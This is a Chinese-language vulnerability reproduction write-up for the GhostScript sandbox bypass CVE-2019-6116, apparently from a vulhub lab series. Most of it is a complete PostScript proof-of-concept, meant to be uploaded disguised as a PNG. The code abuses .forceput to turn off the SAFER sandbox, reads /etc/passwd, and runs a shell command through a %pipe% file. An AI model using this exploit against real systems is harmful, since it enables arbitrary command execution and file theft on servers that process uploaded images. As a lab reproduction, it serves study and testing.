# GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）

###### by ADummy

### 0x00利用路线

​			构造poc png图片--->上传图片--->有回显命令执行

### 0x01漏洞介绍

​			2018年底来自Semmle Security Research Team的Man Yue Mo发表了CVE-2018-16509漏洞的变体CVE-2018-19475，可以通过一个恶意图片绕过GhostScript的沙盒，进而在9.26以前版本的gs中执行任意命令。

### 0x02漏洞复现

将POC作为图片上传，执行命令`id > /tmp/success && cat /tmp/success`：

将如下代码做成png文件，上传。

```
%!PS
% extract .actual_pdfpaintproc operator from pdfdict
/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def

/exploit {
    (Stage 11: Exploitation...)=

    /forceput exch def

    systemdict /SAFER false forceput
    userparams /LockFilePermissions false forceput
    systemdict /userparams get /PermitFileControl [(*)] forceput
    systemdict /userparams get /PermitFileWriting [(*)] forceput
    systemdict /userparams get /PermitFileReading [(*)] forceput

    % update
    save restore

    % All done.
    stop
} def

errordict /typecheck {
    /typecount typecount 1 add def
    (Stage 10: /typecheck #)=only typecount ==

    % The first error will be the .knownget, which we handle and setup the
    % stack. The second error will be the ifelse (missing boolean), and then we
    % dump the operands.
    typecount 1 eq { null } if
    typecount 2 eq { pop 7 get exploit } if
    typecount 3 eq { (unexpected)= quit }  if
} put

% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some
% executable arrays onto the operand stack that contain .forceput, but are not
% marked as executeonly or pseudo-operators.
%
% The routine was attempting to pass them to ifelse, but we can cause that to
% fail because when the routine was declared, it used `bind` but many of the
% names it uses are not operators and so are just looked up in the dictstack.
%
% This means we can push a dict onto the dictstack and control how the routine
% works.
<<
    /typecount      0
    /PDFfile        { (Stage 0: PDFfile)= currentfile }
    /q              { (Stage 1: q)= } % no-op
    /oget           { (Stage 3: oget)= pop pop 0 } % clear stack
    /pdfemptycount  { (Stage 4: pdfemptycount)= } % no-op
    /gput           { (Stage 5: gput)= }  % no-op
    /resolvestream  { (Stage 6: resolvestream)= } % no-op
    /pdfopdict      { (Stage 7: pdfopdict)= } % no-op
    /.pdfruncontext { (Stage 8: .pdfruncontext)= 0 1 mark } % satisfy counttomark and index
    /pdfdict        { (Stage 9: pdfdict)=
        % cause a /typecheck error we handle above
        true
    }
>> begin <<>> <<>> { .actual_pdfpaintproc } stopped pop

(Should now have complete control over ghostscript, attempting to read /etc/passwd...)=

% Demonstrate reading a file we shouldnt have access to.
(/etc/passwd) (r) file dup 64 string readline pop == closefile

(Attempting to execute a shell command...)= flush

% run command
(%pipe%id > /tmp/success) (w) file closefile

(All done.)=

quit
```

![GhostScript_沙箱绕过_RCE3_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/GhostScript_沙箱绕过_RCE3_1.jpg)



![GhostScript_沙箱绕过_RCE3_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/GhostScript_沙箱绕过_RCE3_2.jpg)